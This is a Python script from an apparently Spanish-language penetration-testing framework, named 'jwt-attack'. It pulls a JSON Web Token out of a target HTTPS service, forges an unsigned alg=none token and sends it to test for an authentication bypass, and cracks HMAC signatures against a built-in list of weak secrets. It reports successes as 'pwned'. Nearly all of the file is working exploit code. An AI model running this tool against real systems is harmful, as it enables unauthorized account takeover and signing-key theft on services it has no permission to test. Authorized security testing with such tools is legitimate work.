# scripts/https/attack/jwt_attack.py
import ssl, urllib.request, urllib.error, base64, json, hmac, hashlib, re
from scripts.base import BaseScript
from core.output import print_result, print_table, print_check, console
from core import session_db

WEAK_SECRETS = ["secret","password","123456","admin","test","key","mysecret",
                "supersecret","jwt_secret","your-256-bit-secret","","changeme"]

class Script(BaseScript):
    name        = "jwt-attack"
    protocol    = "https"
    category    = "attack"
    description = "Script propio: ataca JWT sobre HTTPS con alg=none, weak secret y kid injection."

    EXAMPLES = [
        {"flag": "--jwt", "desc": "Token JWT a atacar",
         "good": "https --script=jwt-attack -t 10.10.10.5 --jwt eyJ...",
         "bad":  "https --script=jwt-attack (sin --jwt intenta extraerlo de la respuesta)"},
    ]

    def _b64d(self, s):
        s += "=" * (4 - len(s) % 4)
        return base64.urlsafe_b64decode(s)

    def _b64e(self, b):
        return base64.urlsafe_b64encode(b).rstrip(b"=").decode()

    def _parse(self, token):
        try:
            parts = token.split(".")
            if len(parts) != 3: return None, None, None
            return json.loads(self._b64d(parts[0])), json.loads(self._b64d(parts[1])), parts
        except Exception:
            return None, None, None

    def _forge_none(self, parts):
        header  = json.loads(self._b64d(parts[0]))
        payload = json.loads(self._b64d(parts[1]))
        header["alg"] = "none"
        nh = self._b64e(json.dumps(header, separators=(",",":")).encode())
        np = self._b64e(json.dumps(payload, separators=(",",":")).encode())
        return f"{nh}.{np}."

    def _try_secret(self, parts, secret):
        try:
            msg = f"{parts[0]}.{parts[1]}".encode()
            sig = hmac.new(secret.encode(), msg, hashlib.sha256).digest()
            return self._b64e(sig) == parts[2]
        except Exception:
            return False

    def run(self, **kwargs):
        port    = int(kwargs.get("port") or 443)
        timeout = int(kwargs.get("timeout") or self.target.timeout or 5)
        path    = kwargs.get("path") or "/"
        jwt     = kwargs.get("jwt")
        ip      = self.target.ip
        base    = f"https://{ip}:{port}"

        ctx = ssl.create_default_context()
        ctx.check_hostname = False
        ctx.verify_mode    = ssl.CERT_NONE
        opener = urllib.request.build_opener(urllib.request.HTTPSHandler(context=ctx))

        if not jwt:
            try:
                req  = urllib.request.Request(f"{base}{path}", headers={"User-Agent":"Mozilla/5.0"})
                try:
                    resp = opener.open(req, timeout=timeout)
                    body = resp.read(65536).decode("utf-8", errors="replace")
                    hdrs = {k.lower(): v for k, v in resp.headers.items()}
                except urllib.error.HTTPError as e:
                    body = ""; hdrs = {}
                for val in list(hdrs.values()) + [body]:
                    m = re.search(r"eyJ[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]+\.[a-zA-Z0-9_-]*", val)
                    if m:
                        jwt = m.group(0)
                        print_result("HTTPS", ip, "info", f"JWT encontrado: {jwt[:40]}...")
                        break
            except Exception:
                pass

        if not jwt:
            console.print("[yellow]No se encontró JWT. Usa --jwt <token>[/yellow]")
            return None

        header, payload, parts = self._parse(jwt)
        if not header:
            console.print("[red]Token JWT inválido.[/red]")
            return None

        rows = [("Algoritmo", header.get("alg","?")),
                ("kid",       str(header.get("kid","—"))),
                ("sub",       str(payload.get("sub","—"))),
                ("admin",     str(payload.get("admin","—")))]
        print_table(f"JWT Info HTTPS — {ip}:{port}", ["Campo","Valor"], rows)

        findings = []

        none_token = self._forge_none(parts)
        try:
            req = urllib.request.Request(f"{base}{path}", headers={
                "User-Agent":"Mozilla/5.0","Authorization":f"Bearer {none_token}"})
            try:
                resp   = opener.open(req, timeout=timeout)
                status = resp.status
            except urllib.error.HTTPError as e:
                status = e.code
            if status in (200,201,204):
                findings.append(("alg=none bypass","EXITOSO",f"HTTP {status}"))
                session_db.save_finding(ip, "HTTPS", "jwt_none_alg_bypass", f"port={port}")
                print_result("HTTPS", ip, "pwned", "JWT alg=none BYPASS EXITOSO")
        except Exception:
            pass

        if header.get("alg","").startswith("HS"):
            for secret in WEAK_SECRETS:
                if self._try_secret(parts, secret):
                    findings.append(("Weak secret", secret if secret else "(vacío)", "Crítico"))
                    session_db.save_finding(ip, "HTTPS", "jwt_weak_secret", f"secret={secret}")
                    print_result("HTTPS", ip, "pwned", f"JWT SECRET: '{secret}'")
                    break

        if findings:
            print_table(f"JWT HTTPS — {ip}:{port}", ["Ataque","Detalle","Resultado"], findings)
        else:
            print_check("JWT sin vulnerabilidades obvias", ok=True)

        return {"findings": findings}
